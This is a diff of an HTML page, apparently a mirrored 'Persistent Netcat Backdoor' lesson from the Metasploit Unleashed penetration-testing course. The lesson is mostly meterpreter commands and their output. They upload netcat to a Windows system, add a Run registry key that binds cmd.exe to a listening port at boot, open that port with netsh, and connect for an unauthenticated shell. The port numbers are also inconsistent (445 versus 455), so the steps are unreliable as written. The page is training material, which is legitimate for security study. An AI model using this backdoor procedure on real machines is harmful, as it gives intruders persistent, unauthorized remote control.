@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Persistent Netcat Backdoor - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Persistent_Netcat_Backdoor" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Persistent_Netcat_Backdoor&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Persistent_Netcat_Backdoor&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Persistent_Netcat_Backdoor&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,289 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Persistent Netcat Backdoor</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Persistent_Netcat_Backdoor#column-one">navigation</a>, <a href="Persistent_Netcat_Backdoor#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>In this example, instead of looking up information on the remote system, we will be installing a netcat backdoor. This includes changes to the system registry and firewall.
+<br />
+<br />
+First, we must upload a copy of netcat to the remote system.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>upload /pentest/windows-binaries/tools/nc.exe C:\\windows\\system32</span>
+<span style='color:#0000FF;'>[*]</span> uploading  : /tmp/nc.exe -> C:\windows\system32
+<span style='color:#0000FF;'>[*]</span> uploaded   : /tmp/nc.exe -> C:\windows\system32nc.exe</pre>
+<br />
+Afterwards, we work with the registry to have netcat execute on start up and listen on port 455.  We do this by editing the key 'HKLM\software\microsoft\windows\currentversion\run'.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span>
+Enumerating: HKLM\software\microsoft\windows\currentversion\run
+
+  Values (3):
+
+    VMware Tools
+    VMware User Process
+    quicktftpserver
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'</span>
+Successful set nc.
+<u>meterpreter</u> > <span style='color:#13C16A;'>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span>
+Key: HKLM\software\microsoft\windows\currentversion\Run
+Name: nc
+Type: REG_SZ
+Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe</pre>
+<br />
+Next, we need to alter the system to allow remote connections through the firewall to our netcat backdoor. We open up an interactive command prompt and use the 'netsh' command to make the changes as it is far less error prone than altering the registry directly.  Plus, the process shown should work across more versions of Windows, as registry locations and functions are highly version and patch level dependent.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>execute -f cmd -i</span>
+Process 1604 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Jim\My Documents > <span style='color:#13C16A;'>netsh firewall show opmode</span>
+Netsh firewall show opmode
+
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+
+Local Area Connection firewall configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable</pre>
+<br />
+We open up port 445 in the firewall and double-check that it was set properly.
+<br />
+<br />
+<pre>C:\Documents and Settings\Jim\My Documents > <span style='color:#13C16A;'>netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL</span>
+netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL
+Ok.
+
+C:\Documents and Settings\Jim\My Documents > <span style='color:#13C16A;'>netsh firewall show portopening</span>
+netsh firewall show portopening
+
+Port configuration for Domain profile:
+Port   Protocol  Mode     Name
+-------------------------------------------------------------------
+139    TCP       Enable   NetBIOS Session Service
+445    TCP       Enable   SMB over TCP
+137    UDP       Enable   NetBIOS Name Service
+138    UDP       Enable   NetBIOS Datagram Service
+
+Port configuration for Standard profile:
+Port   Protocol  Mode     Name
+-------------------------------------------------------------------
+455    TCP       Enable   Service Firewall
+139    TCP       Enable   NetBIOS Session Service
+445    TCP       Enable   SMB over TCP
+137    UDP       Enable   NetBIOS Name Service
+138    UDP       Enable   NetBIOS Datagram Service
+
+
+C:\Documents and Settings\Jim\My Documents ></pre>
+<br />
+So with that being completed, we will reboot the remote system and test out the netcat shell.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>nc -v 172.16.104.128 455</span>
+172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [172.16.104.128] 455 (?) open
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Jim > <span style='color:#13C16A;'>dir</span>
+dir
+Volume in drive C has no label.
+Volume Serial Number is E423-E726
+
+Directory of C:\Documents and Settings\Jim
+
+05/03/2009 01:43 AM
+.
+05/03/2009 01:43 AM
+..
+05/03/2009 01:26 AM 0 ;i
+05/12/2009 10:53 PM
+Desktop
+10/29/2008 05:55 PM
+Favorites
+05/12/2009 10:53 PM
+My Documents
+05/03/2009 01:43 AM 0 QCY
+10/29/2008 03:51 AM
+Start Menu
+05/03/2009 01:25 AM 0 talltelnet.log
+05/03/2009 01:25 AM 0 talltftp.log
+4 File(s) 0 bytes
+6 Dir(s) 35,540,791,296 bytes free
+
+C:\Documents and Settings\Jim ></pre>
+<br />
+Wonderful! In a real world situation, we would not be using such a simple backdoor as this, with no authentication or encryption, however the principles of this process remain the same for other changes to the system, and other sorts of programs one might want to execute on start up. 
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &gt; Persistent Netcat Backdoor</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Persistent Netcat Backdoor</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 519/1000000
+Preprocessor generated node count: 2703/1000000
+Post‐expand include size: 4584/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:107-0!*!0!*!*!*!* and timestamp 20131123213308 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Persistent_Netcat_Backdoor&amp;oldid=1544">http://www.offensive-security.com/w/index.php?title=Persistent_Netcat_Backdoor&amp;oldid=1544</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Interacting_With_The_Registry&amp;action=edit&amp;redlink=1" class="new" title="Category:Interacting With The Registry (page does not exist)">Interacting With The Registry</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +774,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.132 secs. --></body></html>
